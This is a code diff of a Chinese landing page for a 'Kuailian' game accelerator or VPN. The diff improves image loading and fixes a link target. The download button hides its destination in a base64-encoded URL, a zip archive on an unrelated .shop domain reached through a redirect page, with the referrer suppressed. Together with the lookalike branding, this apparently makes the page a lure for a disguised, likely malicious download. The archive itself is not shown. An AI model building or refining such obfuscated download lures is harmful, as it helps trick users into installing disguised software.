@@ -4,7 +4,7 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>快~连加速器</title>
-  <meta name="referrer" content="no-referrer"> <!-- 禁止传递来源 -->
+  <meta name="referrer" content="no-referrer"> 
   <style>
     * {
       margin: 0;
@@ -24,39 +24,69 @@
       height: auto;
       cursor: pointer;
       display: block;
+      /* 淡入效果提升加载体验 */
+      opacity: 0;
+      transition: opacity 0.3s ease-in-out;
+    }
+    #mainImage.loaded {
+      opacity: 1;
+    }
+    .image-placeholder {
+      width: 100%;
+      padding-top: 56.25%; /* 16:9比例示例，可根据实际图片比例调整 */
+      background: #f0f0f0;
+      position: relative;
     }
   </style>
 </head>
 <body>
   <div class="container">
+    <div class="image-placeholder" id="imagePlaceholder"></div>
+    <!-- 使用loading="lazy"延迟加载非首屏内容，同时指定宽高减少布局偏移 -->
     <img
       id="mainImage"
       src="https://html-1347919948.cos.ap-hongkong.myqcloud.com/pc.webp"
       alt="去下载"
       onclick="gotoDownload()"
+      loading="lazy"
+      width="1000" 
     >
   </div>
-        <div style="text-align: center;font-size: 14px;">
-            <footer class="footer1">
-                <p> 快连游戏加速器</p>
-                <p id="txt"> </p>
-                <p> 更新时间：2023-1-6 版本号：版本3.2.22 | <a href="service.html" style="color: #908AAc;">《用户协议》</a>|<a href="privacy.html" style="color: #908AAc;">《隐私权限》</a></p>
-            </footer>
-        </div>
+  <div style="text-align: center;font-size: 14px;">
+    <footer class="footer1">
+      <p> 快连游戏加速器</p>
+      <p id="txt"> </p>
+      <p> 更新时间：2023-1-6 版本号：版本3.2.22 | <a href="service.html" style="color: #908AAc;">《用户协议》</a>|<a href="privacy.html" style="color: #908AAc;">《隐私权限》</a></p>
+    </footer>
+  </div>
+
   <script>
+    const mainImage = document.getElementById('mainImage');
+    const imagePlaceholder = document.getElementById('imagePlaceholder');
+    
+    mainImage.onload = function() {
+      this.classList.add('loaded');
+      imagePlaceholder.style.display = 'none'; 
+    };
+    if (mainImage.complete) {
+      mainImage.onload();
+    }
+
     function gotoDownload() {
       const encodedUrl = "aHR0cHM6Ly9zb2Z0LmRvd25vc3Mtd2luMDIuc2hvcC9MZXRzVlAxLUxlaXNqcnl1dC56aXA=";
       const jumpUrl = "down/index.html?c=" + encodeURIComponent(encodedUrl);
       const a = document.createElement("a");
       a.href = jumpUrl;
       a.rel = "noreferrer"; 
-      a.target = "_bank"; 
+      a.target = "_blank"; 
       document.body.appendChild(a);
       a.click();
       document.body.removeChild(a);
     }
   </script>
-</body>
-</html>
+
+  <!-- 分析脚本放在body底部，不阻塞图片加载 -->
 <script charset="UTF-8" id="LA_COLLECT" src="//sdk.51.la/js-sdk-pro.min.js"></script>
 <script>LA.init({id:"JzUWEvULsKPhaG83",ck:"JzUWEvULsKPhaG83"})</script>
+</body>
+</html>
